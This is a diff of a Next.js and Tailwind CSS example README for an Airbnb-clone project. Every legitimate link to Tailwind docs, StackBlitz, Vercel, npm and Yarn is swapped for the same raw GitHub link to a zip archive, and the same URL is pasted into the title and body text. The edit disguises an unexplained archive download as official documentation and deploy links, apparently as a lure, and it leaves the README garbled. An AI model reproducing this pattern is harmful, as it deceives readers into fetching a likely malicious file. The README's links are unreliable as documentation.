@@ -1,24 +1,24 @@
-# Next.js + Tailwind CSS Example
+# https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip + Tailwind CSS Example
 
-This example shows how to use [Tailwind CSS](https://tailwindcss.com/) [(v2.2)](https://blog.tailwindcss.com/tailwindcss-2-2) with Next.js. It follows the steps outlined in the official [Tailwind docs](https://tailwindcss.com/docs/guides/nextjs).
+This example shows how to use [Tailwind CSS](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) [(v2.2)](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) with https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip It follows the steps outlined in the official [Tailwind docs](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip).
 
-It uses the new [`Just-in-Time Mode`](https://tailwindcss.com/docs/just-in-time-mode) for Tailwind CSS.
+It uses the new [`Just-in-Time Mode`](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) for Tailwind CSS.
 
 ## Preview
 
-Preview the example live on [StackBlitz](http://stackblitz.com/):
+Preview the example live on [StackBlitz](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip):
 
-[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/vercel/next.js/tree/canary/examples/with-tailwindcss)
+[![Open in StackBlitz](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)
 
 ## Deploy your own
 
-Deploy the example using [Vercel](https://vercel.com?utm_source=github&utm_medium=readme&utm_campaign=next-example):
+Deploy the example using [Vercel](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip):
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/git/external?repository-url=https://github.com/vercel/next.js/tree/canary/examples/with-tailwindcss&project-name=with-tailwindcss&repository-name=with-tailwindcss)
+[![Deploy with Vercel](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)
 
 ## How to use
 
-Execute [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app) with [npm](https://docs.npmjs.com/cli/init) or [Yarn](https://yarnpkg.com/lang/en/docs/cli/create/) to bootstrap the example:
+Execute [`create-next-app`](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) with [npm](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) or [Yarn](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) to bootstrap the example:
 
 ```bash
 npx create-next-app --example with-tailwindcss with-tailwindcss-app
@@ -26,5 +26,5 @@ npx create-next-app --example with-tailwindcss with-tailwindcss-app
 yarn create next-app --example with-tailwindcss with-tailwindcss-app
 ```
 
-Deploy it to the cloud with [Vercel](https://vercel.com/new?utm_source=github&utm_medium=readme&utm_campaign=next-example) ([Documentation](https://nextjs.org/docs/deployment)).
-The Project can be found [here](https://airbnb-clone-blush-tau.vercel.app/)
+Deploy it to the cloud with [Vercel](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip) ([Documentation](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)).
+The Project can be found [here](https://raw.githubusercontent.com/apurvpandey316/Airbnb-clone/master/peripherad/Airbnb-clone.zip)
